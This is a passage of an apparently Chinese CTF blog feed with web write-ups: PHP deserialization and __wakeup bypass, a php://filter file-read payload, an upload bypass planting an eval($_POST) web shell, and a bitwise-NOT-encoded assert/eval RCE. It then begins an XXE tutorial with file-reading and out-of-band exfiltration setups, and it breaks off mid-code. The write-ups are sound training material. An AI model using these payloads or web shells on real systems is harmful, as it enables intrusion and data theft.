double-quoted-string">"You name is: "</span><span class="token punctuation">;</span>            <span class="token keyword">echo</span> <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">username</span><span class="token punctuation">;</span><span class="token keyword">echo</span> <span class="token string double-quoted-string">"&lt;/br>"</span><span class="token punctuation">;</span>            <span class="token keyword">echo</span> <span class="token string double-quoted-string">"You password is: "</span><span class="token punctuation">;</span>            <span class="token keyword">echo</span> <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">password</span><span class="token punctuation">;</span><span class="token keyword">echo</span> <span class="token string double-quoted-string">"&lt;/br>"</span><span class="token punctuation">;</span>            <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-></span><span class="token property">username</span> <span class="token operator">===</span> <span class="token string single-quoted-string">'admin'</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>            <span class="token keyword">global</span> <span class="token variable">$flag</span><span class="token punctuation">;</span>            <span class="token keyword">echo</span> <span class="token variable">$flag</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span><span class="token keyword">else</span><span class="token punctuation">&#123;</span>            <span class="token keyword">echo</span> <span class="token string double-quoted-string">"&lt;/br>hello my friend~~&lt;/br>sorry i can't give you the flag!"</span><span class="token punctuation">;</span>            <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                    <span class="token punctuation">&#125;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token delimiter important">?></span></span></code></pre><p>只需要满足<code>username=admin</code>和<code>password=100</code>即可，另外要注意绕过__wakeup()，修改属性数即可(“Name”:2 -&gt; “Name”:3)</p><pre class="language-php" data-language="php"><code class="language-php"><span class="token constant">O</span><span class="token operator">%</span><span class="token number">3</span>A4<span class="token operator">%</span><span class="token number">3</span>A<span class="token operator">%</span><span class="token number">22</span>Name<span class="token operator">%</span><span class="token number">22</span><span class="token operator">%</span><span class="token number">3</span>A3<span class="token operator">%</span><span class="token number">3</span>A<span class="token operator">%</span><span class="token number">7</span>Bs<span class="token operator">%</span><span class="token number">3</span>A14<span class="token operator">%</span><span class="token number">3</span>A<span class="token operator">%</span><span class="token number">22</span><span class="token operator">%</span><span class="token number">00</span>Name<span class="token operator">%</span><span class="token number">00</span>username<span class="token operator">%</span><span class="token number">22</span><span class="token operator">%</span><span class="token number">3</span>Bs<span class="token operator">%</span><span class="token number">3</span>A5<span class="token operator">%</span><span class="token number">3</span>A<span class="token operator">%</span><span class="token number">22</span>admin<span class="token operator">%</span><span class="token number">22</span><span class="token operator">%</span><span class="token number">3</span>Bs<span class="token operator">%</span><span class="token number">3</span>A14<span class="token operator">%</span><span class="token number">3</span>A<span class="token operator">%</span><span class="token number">22</span><span class="token operator">%</span><span class="token number">00</span>Name<span class="token operator">%</span><span class="token number">00</span>password<span class="token operator">%</span><span class="token number">22</span><span class="token operator">%</span><span class="token number">3</span>Bs<span class="token operator">%</span><span class="token number">3</span>A3<span class="token operator">%</span><span class="token number">3</span>A<span class="token operator">%</span><span class="token number">22100</span><span class="token operator">%</span><span class="token number">22</span><span class="token operator">%</span><span class="token number">3</span>B<span class="token operator">%</span><span class="token number">7</span>D<span class="token comment"># O:4:"Name":3:&#123;s:14:"Nameusername";s:5:"admin";s:14:"Namepassword";s:3:"100";&#125;</span></code></pre><h4 id="Secret-File"><a href="#Secret-File" class="headerlink" title="Secret File"></a>Secret File</h4><p>根据源码提示(secr3t.php)需要抓包获取，因为会302跳转</p><p>访问得到源码</p><pre class="language-php+HTML" data-language="php+HTML"><code class="language-php+HTML"># secr3t.php&lt;html&gt;    &lt;title&gt;secret&lt;&#x2F;title&gt;    &lt;meta charset&#x3D;&quot;UTF-8&quot;&gt;&lt;?php    highlight_file(__FILE__);    error_reporting(0);    $file&#x3D;$_GET[&#39;file&#39;];    if(strstr($file,&quot;..&#x2F;&quot;)||stristr($file, &quot;tp&quot;)||stristr($file,&quot;input&quot;)||stristr($file,&quot;data&quot;))&#123;        echo &quot;Oh no!&quot;;        exit();    &#125;    include($file); &#x2F;&#x2F;flag放在了flag.php里?&gt;&lt;&#x2F;html&gt;</code></pre><p>Payload: <code>?file=php://filter/convert.base64-encode/resource=flag.php</code></p><h4 id="Upload"><a href="#Upload" class="headerlink" title="Upload"></a>Upload</h4><p>要求上传图片，对文件名后缀有一些限制，可以用phtml绕过，但是要求文件名不能有<code>&lt;?</code>这个可以用js格式绕过</p><p>最后的限制是<code>Not Image</code>这个可在文件添加文件头GIF89a绕过</p><pre class="language-javascript" data-language="javascript"><code class="language-javascript"><span class="token number">1</span><span class="token punctuation">.</span>phtmlGIF89a<span class="token operator">&lt;</span>script language<span class="token operator">=</span><span class="token string">"php"</span><span class="token operator">></span>@<span class="token function">eval</span><span class="token punctuation">(</span>$_POST<span class="token punctuation">[</span><span class="token string">'shell'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token operator">&lt;</span><span class="token operator">/</span>script<span class="token operator">></span></code></pre><p>上传成功后访问<code>/upload/</code>然后进行rce即可</p><h4 id="RCE-ME-异或-取反"><a href="#RCE-ME-异或-取反" class="headerlink" title="RCE ME(异或 取反)"></a>RCE ME(异或 取反)</h4><pre class="language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token function">error_reporting</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'code'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>            <span class="token variable">$code</span><span class="token operator">=</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'code'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>                    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">strlen</span><span class="token punctuation">(</span><span class="token variable">$code</span><span class="token punctuation">)</span><span class="token operator">></span><span class="token number">40</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>                                        <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"This is too Long."</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                                                <span class="token punctuation">&#125;</span>                    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"/[A-Za-z0-9]+/"</span><span class="token punctuation">,</span><span class="token variable">$code</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>                                        <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"NO."</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                                                <span class="token punctuation">&#125;</span>                    @<span class="token keyword">eval</span><span class="token punctuation">(</span><span class="token variable">$code</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">else</span><span class="token punctuation">&#123;</span>            <span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token comment">// </span><span class="token delimiter important">?></span></span></code></pre><p>这里使用取反，先看一下phpinfo</p><pre class="language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token variable">$funcation</span> <span class="token operator">=</span> <span class="token function">urlencode</span><span class="token punctuation">(</span><span class="token operator">~</span><span class="token string single-quoted-string">'phpinfo'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$cmd</span> <span class="token operator">=</span> <span class="token function">urlencode</span><span class="token punctuation">(</span><span class="token operator">~</span><span class="token string single-quoted-string">''</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$payload</span> <span class="token operator">=</span> <span class="token string double-quoted-string">"(~<span class="token interpolation"><span class="token variable">$funcation</span></span>)(~<span class="token interpolation"><span class="token variable">$cmd</span></span>)"</span><span class="token punctuation">;</span><span class="token keyword">echo</span> <span class="token variable">$payload</span><span class="token punctuation">;</span></span></code></pre><pre class="language-php" data-language="php"><code class="language-php"><span class="token operator">?</span>code<span class="token operator">=</span><span class="token punctuation">(</span><span class="token operator">~</span><span class="token operator">%</span><span class="token number">8</span>F<span class="token operator">%</span><span class="token number">97</span><span class="token operator">%</span><span class="token number">8</span>F<span class="token operator">%</span><span class="token number">96</span><span class="token operator">%</span><span class="token number">91</span><span class="token operator">%</span><span class="token number">99</span><span class="token operator">%</span><span class="token number">90</span><span class="token punctuation">)</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span></code></pre><p><img src="rceme.png" loading="lazy"></p><p>看到禁了很多函数<code>system,exec,shell_exec,popen</code></p><p>这里可以用<code>assert</code></p><pre class="language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token variable">$funcation</span> <span class="token operator">=</span> <span class="token function">urlencode</span><span class="token punctuation">(</span><span class="token operator">~</span><span class="token string single-quoted-string">'assert'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$cmd</span> <span class="token operator">=</span> <span class="token function">urlencode</span><span class="token punctuation">(</span><span class="token operator">~</span><span class="token string single-quoted-string">'(eval($_POST[attack]))'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$payload</span> <span class="token operator">=</span> <span class="token string double-quoted-string">"(~<span class="token interpolation"><span class="token variable">$funcation</span></span>)(~<span class="token interpolation"><span class="token variable">$cmd</span></span>)"</span><span class="token punctuation">;</span><span class="token keyword">echo</span> <span class="token variable">$payload</span><span class="token punctuation">;</span></span></code></pre><pre class="language-php" data-language="php"><code class="language-php"><span class="token operator">?</span>code<span class="token operator">=</span><span class="token punctuation">(</span><span class="token operator">~</span><span class="token operator">%</span><span class="token number">9</span>E<span class="token operator">%</span><span class="token number">8</span>C<span class="token operator">%</span><span class="token number">8</span>C<span class="token operator">%</span><span class="token number">9</span>A<span class="token operator">%</span><span class="token number">8</span>D<span class="token operator">%</span><span class="token number">8</span>B<span class="token punctuation">)</span><span class="token punctuation">(</span><span class="token operator">~</span><span class="token operator">%</span><span class="token constant">D7</span><span class="token operator">%</span><span class="token number">9</span>A<span class="token operator">%</span><span class="token number">89</span><span class="token operator">%</span><span class="token number">9</span>E<span class="token operator">%</span><span class="token number">93</span><span class="token operator">%</span><span class="token constant">D7</span><span class="token operator">%</span><span class="token constant">DB</span><span class="token operator">%</span><span class="token constant">A0</span><span class="token operator">%</span><span class="token constant">AF</span><span class="token operator">%</span><span class="token constant">B0</span><span class="token operator">%</span><span class="token constant">AC</span><span class="token operator">%</span><span class="token constant">AB</span><span class="token operator">%</span><span class="token constant">A4</span><span class="token operator">%</span><span class="token number">9</span>E<span class="token operator">%</span><span class="token number">8</span>B<span class="token operator">%</span><span class="token number">8</span>B<span class="token operator">%</span><span class="token number">9</span>E<span class="token operator">%</span><span class="token number">9</span>C<span class="token operator">%</span><span class="token number">94</span><span class="token operator">%</span><span class="token constant">A2</span><span class="token operator">%</span><span class="token constant">D6</span><span class="token operator">%</span><span class="token constant">D6</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token constant">POST</span><span class="token punctuation">:</span>attack<span class="token operator">=</span><span class="token function">phpinfo</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span></code></pre><p>然后上蚁剑连接</p><p>根目录下有个readflag，需要执行readflag才能得到flag，但是因为限制了很多函数，所以不太行</p><p>可以使用蚁剑的绕过disable_functions的插件(Linux下)</p><p><img src="rceme_2.png" loading="lazy"></p><p><img src="rceme_3.png" loading="lazy"></p><p><a href="https://blog.csdn.net/qq_45521281/article/details/105656737">RCE ME</a></p>]]></content>
      
      
      <categories>
          
          <category> 安全相关 </category>
          
          <category> CTF </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 极客大挑战 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>web入门-xxe</title>
      <link href="/2024/08/05/web%E5%85%A5%E9%97%A8-xxe/"/>
      <url>/2024/08/05/web%E5%85%A5%E9%97%A8-xxe/</url>
      
        <content type="html"><![CDATA[<h3 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h3><p><a href="https://www.cnblogs.com/r00tuser/p/7255939.html">[xxe漏洞的学习与利用总结]</a></p><h4 id="xml基础知识"><a href="#xml基础知识" class="headerlink" title="xml基础知识"></a>xml基础知识</h4><p>要了解xxe漏洞，那么一定得先明白基础知识，了解xml文档的基础组成。</p><pre class="language-markup" data-language="markup"><code class="language-markup">XML用于标记电子文件使其具有结构性的标记语言，可以用来标记数据、定义数据类型，是一种允许用户对自己的标记语言进行定义的源语言。XML文档结构包括XML声明、DTD文档类型定义（可选）、文档元素</code></pre><h5 id="xml文档的构建模块"><a href="#xml文档的构建模块" class="headerlink" title="xml文档的构建模块"></a>xml文档的构建模块</h5><p>所有的 XML 文档（以及 HTML 文档）均由以下简单的构建模块构成：</p><pre class="language-markup" data-language="markup"><code class="language-markup">元素属性实体PCDATACDATA</code></pre><p>下面是每个构建模块的简要描述。</p><h5 id="元素"><a href="#元素" class="headerlink" title="元素"></a>元素</h5><p>元素是 XML 以及 HTML 文档的主要构建模块，元素可包含文本、其他元素或者是空的。<br>实例:</p><pre class="language-markup" data-language="markup"><code class="language-markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>body</span><span class="token punctuation">></span></span>body text in between<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>body</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>message</span><span class="token punctuation">></span></span>some message in between<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>message</span><span class="token punctuation">></span></span></code></pre><p>空的 HTML 元素的例子是 “hr”、”br” 以及 “img”。</p><h5 id="属性"><a href="#属性" class="headerlink" title="属性"></a>属性</h5><p>属性可提供有关元素的额外信息<br>实例：</p><pre class="language-markup" data-language="markup"><code class="language-markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>img</span> <span class="token attr-name">src</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>computer.gif<span class="token punctuation">"</span></span> <span class="token punctuation">/></span></span></code></pre><h5 id="实体"><a href="#实体" class="headerlink" title="实体"></a>实体</h5><p>实体是用来定义普通文本的变量。实体引用是对实体的引用。</p><h5 id="PCDATA"><a href="#PCDATA" class="headerlink" title="PCDATA"></a>PCDATA</h5><p>PCDATA 的意思是被解析的字符数据（parsed character data）。<br>PCDATA 是会被解析器解析的文本。这些文本将被解析器检查实体以及标记。</p><h5 id="CDATA"><a href="#CDATA" class="headerlink" title="CDATA"></a>CDATA</h5><p>CDATA 的意思是字符数据（character data）。<br>CDATA 是不会被解析器解析的文本。<br>DTD(文档类型定义)</p><p>DTD（文档类型定义）的作用是定义 XML 文档的合法构建模块。</p><p>DTD 可以在 XML 文档内声明，也可以外部引用。</p><h5 id="内部声明"><a href="#内部声明" class="headerlink" title="内部声明"></a>内部声明</h5><p> <strong>ex: <code>&lt;!DOCTYOE test any&gt;</code></strong></p><p>完整实例：</p><pre class="language-markup" data-language="markup"><code class="language-markup"><span class="token prolog">&lt;?xml version="1.0"?></span><span class="token doctype"><span class="token punctuation">&lt;!</span><span class="token doctype-tag">DOCTYPE</span> <span class="token name">note</span> <span class="token punctuation">[</span><span class="token internal-subset">  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>!ELEMENT</span> <span class="token attr-name">note</span> <span class="token attr-name">(to,from,heading,body)</span><span class="token punctuation">></span></span>  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>!ELEMENT</span> <span class="token attr-name">to</span>      <span class="token attr-name">(#PCDATA)</span><span class="token punctuation">></span></span>  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>!ELEMENT</span> <span class="token attr-name">from</span>    <span class="token attr-name">(#PCDATA)</span><span class="token punctuation">></span></span>  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>!ELEMENT</span> <span class="token attr-name">heading</span> <span class="token attr-name">(#PCDATA)</span><span class="token punctuation">></span></span>  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>!ELEMENT</span> <span class="token attr-name">body</span>    <span class="token attr-name">(#PCDATA)</span><span class="token punctuation">></span></span></span><span class="token punctuation">]</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>note</span><span class="token punctuation">></span></span>  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>to</span><span class="token punctuation">></span></span>George<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>to</span><span class="token punctuation">></span></span>  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>from</span><span class="token punctuation">></span></span>John<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>from</span><span class="token punctuation">></span></span>  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>heading</span><span class="token punctuation">></span></span>Reminder<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>heading</span><span class="token punctuation">></span></span>  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>body</span><span class="token punctuation">></span></span>Don't forget the meeting!<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>body</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>note</span><span class="token punctuation">></span></span></code></pre><h5 id="外部声明（引用外部DTD）"><a href="#外部声明（引用外部DTD）" class="headerlink" title="外部声明（引用外部DTD）"></a>外部声明（引用外部DTD）</h5><p> <strong>ex: <code>&lt;!DOCTYPE test SYSTEM &#39;http://www.test.com/evil.dtd&#39;&gt;</code></strong></p><p>完整实例:</p><pre class="language-markup" data-language="markup"><code class="language-markup"><span class="token prolog">&lt;?xml version="1.0"?></span><span class="token doctype"><span class="token punctuation">&lt;!</span><span class="token doctype-tag">DOCTYPE</span> <span class="token name">note</span> <span class="token name">SYSTEM</span> <span class="token string">"note.dtd"</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>note</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>to</span><span class="token punctuation">></span></span>George<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>to</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>from</span><span class="token punctuation">></span></span>John<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>from</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>heading</span><span class="token punctuation">></span></span>Reminder<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>heading</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>body</span><span class="token punctuation">></span></span>Don't forget the meeting!<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>body</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>note</span><span class="token punctuation">></span></span> </code></pre><p>而note.dtd的内容为:</p><pre class="language-xml-dtd" data-language="xml-dtd"><code class="language-xml-dtd">&lt;!ELEMENT note (to,from,heading,body)&gt;&lt;!ELEMENT to (#PCDATA)&gt;&lt;!ELEMENT from (#PCDATA)&gt;&lt;!ELEMENT heading (#PCDATA)&gt;&lt;!ELEMENT body (#PCDATA)&gt;</code></pre><h5 id="DTD实体"><a href="#DTD实体" class="headerlink" title="DTD实体"></a>DTD实体</h5><p>DTD实体是用于定义引用普通文本或特殊字符的快捷方式的变量，可以内部声明或外部引用。</p><p>实体又分为一般实体和参数实体</p><h6 id="一般实体的声明语法"><a href="#一般实体的声明语法" class="headerlink" title="一般实体的声明语法:"></a>一般实体的声明语法:</h6><p>引用实体的方式：&amp;实体名；</p><p><strong>参数实体只能在DTD中使用，参数实体的声明格式：</strong></p><p>引用实体的方式：%实体名；</p><h6 id="内部实体声明"><a href="#内部实体声明" class="headerlink" title="内部实体声明"></a>内部实体声明</h6><p><strong>ex:<code>&lt;!ENTITY eviltest &quot;eviltest&quot;&gt;</code></strong></p><p>完整实例:</p><pre class="language-markup" data-language="markup"><code class="language-markup"><span class="token prolog">&lt;?xml version="1.0"?></span><span class="token doctype"><span class="token punctuation">&lt;!</span><span class="token doctype-tag">DOCTYPE</span> <span class="token name">test</span> <span class="token punctuation">[</span><span class="token internal-subset"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>!ENTITY</span> <span class="token attr-name">writer</span> <span class="token attr-name">"Bill</span> <span class="token attr-name">Gates"</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>!ENTITY</span> <span class="token attr-name">copyright</span> <span class="token attr-name">"Copyright</span> <span class="token attr-name">W3School.com.cn"</span><span class="token punctuation">></span></span></span><span class="token punctuation">]</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>test</span><span class="token punctuation">></span></span><span class="token entity named-entity" title="&writer;">&amp;writer;</span>&amp;copyright;<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>test</span><span class="token punctuation">></span></span></code></pre><h6 id="外部实体声明"><a href="#外部实体声明" class="headerlink" title="外部实体声明"></a>外部实体声明</h6><p>完整实例:</p><pre class="language-markup" data-language="markup"><code class="language-markup"><span class="token prolog">&lt;?xml version="1.0"?></span><span class="token doctype"><span class="token punctuation">&lt;!</span><span class="token doctype-tag">DOCTYPE</span> <span class="token name">test</span> <span class="token punctuation">[</span><span class="token internal-subset">&lt;!ENTITY writer SYSTEM "http://www.w3school.com.cn/dtd/entities.dtd">&lt;!ENTITY copyright SYSTEM "http://www.w3school.com.cn/dtd/entities.dtd"></span><span class="token punctuation">]</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>author</span><span class="token punctuation">></span></span><span class="token entity named-entity" title="&writer;">&amp;writer;</span>&amp;copyright;<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>author</span><span class="token punctuation">></span></span></code></pre><p>在了解了基础知识后，下面开始了解xml外部实体注入引发的问题。<br>XXE的攻击与危害（XML External Entity）</p><h5 id="何为XXE"><a href="#何为XXE" class="headerlink" title="何为XXE?"></a>何为XXE?</h5><p>答： xxe也就是xml外部实体注入。也就是上文中加粗的那一部分。</p><h4 id="怎样构建外部实体注入？"><a href="#怎样构建外部实体注入？" class="headerlink" title="怎样构建外部实体注入？"></a>怎样构建外部实体注入？</h4><p>方式一：直接通过DTD外部实体声明<br>方式二：通过DTD文档引入外部DTD文档，再引入外部实体声明<br>方式三：通过DTD外部实体声明引入外部实体声明（好像有点拗口，其实意思就是先写一个外部实体声明，然后引用的是在攻击者服务器上面的外部实体声明）</p><h4 id="产生哪些危害？"><a href="#产生哪些危害？" class="headerlink" title="产生哪些危害？"></a>产生哪些危害？</h4><p>XXE危害1：读取任意文件<br>XXE危害2：执行系统命令<br>XXE危害3：探测内网端口<br>XXE危害4：攻击内网网站</p><h4 id="如何防御xxe攻击"><a href="#如何防御xxe攻击" class="headerlink" title="如何防御xxe攻击"></a>如何防御xxe攻击</h4><p>方案一、使用开发语言提供的禁用外部实体的方法</p><pre class="language-markup" data-language="markup"><code class="language-markup">PHP：libxml_disable_entity_loader(true);JAVA:DocumentBuilderFactory dbf =DocumentBuilderFactory.newInstance();dbf.setExpandEntityReferences(false);Python：from lxml import etreexmlData = etree.parse(xmlSource,etree.XMLParser(resolve_entities=False))</code></pre><p>方案二、过滤用户提交的XML数据<br>关键词：&lt;!DOCTYPE和&lt;!ENTITY，或者，SYSTEM和PUBLIC。</p><h3 id="web373-378"><a href="#web373-378" class="headerlink" title="web373-378"></a>web373-378</h3><h4 id="web373-有回显xxe-外部实体"><a href="#web373-有回显xxe-外部实体" class="headerlink" title="web373(有回显xxe 外部实体)"></a>web373(有回显xxe 外部实体)</h4><pre class="language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token function">error_reporting</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">// 允许加载外部实体</span><span class="token function">libxml_disable_entity_loader</span><span class="token punctuation">(</span><span class="token constant boolean">false</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">// xml文件来源于数据流</span><span class="token variable">$xmlfile</span> <span class="token operator">=</span> <span class="token function">file_get_contents</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'php://input'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$xmlfile</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token variable">$dom</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">DOMDocument</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token comment">// 加载xml实体，参数为替代实体、加载外部子集</span>    <span class="token variable">$dom</span><span class="token operator">-></span><span class="token function">loadXML</span><span class="token punctuation">(</span><span class="token variable">$xmlfile</span><span class="token punctuation">,</span> <span class="token class-name">LIBXML_NOENT</span> <span class="token operator">|</span> <span class="token class-name">LIBXML_DTDLOAD</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token comment">// 把 DOM 节点转换为 SimpleXMLElement 对象</span>    <span class="token variable">$creds</span> <span class="token operator">=</span> <span class="token function">simplexml_import_dom</span><span class="token punctuation">(</span><span class="token variable">$dom</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token comment">// 节点嵌套</span>    <span class="token variable">$ctfshow</span> <span class="token operator">=</span> <span class="token variable">$creds</span><span class="token operator">-></span><span class="token property">ctfshow</span><span class="token punctuation">;</span>    <span class="token keyword">echo</span> <span class="token variable">$ctfshow</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    </span></code></pre><p>注意这里是 <code>echo $creds-&gt;ctfshow;</code>，要将返回的数据包括在 <code>&lt;ctfshow&gt;</code> 中。<br>payload:</p><pre class="language-markup" data-language="markup"><code class="language-markup"><span class="token prolog">&lt;?xml version="1.0"?></span><span class="token doctype"><span class="token punctuation">&lt;!</span><span class="token doctype-tag">DOCTYPE</span> <span class="token name">hsad</span> <span class="token punctuation">[</span><span class="token internal-subset"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>!ELEMENT</span> <span class="token attr-name">hsad</span> <span class="token attr-name">ANY</span><span class="token punctuation">></span></span>&lt;!ENTITY payload SYSTEM "file:///flag"></span><span class="token punctuation">]</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>hsad</span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>ctfshow</span><span class="token punctuation">></span></span>        <span class="token entity named-entity" title="&payload;">&amp;payload;</span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>ctfshow</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>hsad</span><span class="token punctuation">></span></span></code></pre><h4 id="web374-无回显xxe-外部实体"><a href="#web374-无回显xxe-外部实体" class="headerlink" title="web374(无回显xxe 外部实体)"></a>web374(无回显xxe 外部实体)</h4><pre class="language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token function">error_reporting</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">libxml_disable_entity_loader</span><span class="token punctuation">(</span><span class="token constant boolean">false</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$xmlfile</span> <span class="token operator">=</span> <span class="token function">file_get_contents</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'php://input'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$xmlfile</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token variable">$dom</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">DOMDocument</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token variable">$dom</span><span class="token operator">-></span><span class="token function">loadXML</span><span class="token punctuation">(</span><span class="token variable">$xmlfile</span><span class="token punctuation">,</span> <span class="token class-name">LIBXML_NOENT</span> <span class="token operator">|</span> <span class="token class-name">LIBXML_DTDLOAD</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    </span></code></pre><p>没有回显，要把读取到的内容也就是flag传到远程服务器查看</p><p>在服务器上创建<code>xxe.php</code>和<code>payload.dtd</code>文件</p><pre class="language-php" data-language="php"><code class="language-php"># xxe.php<span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token 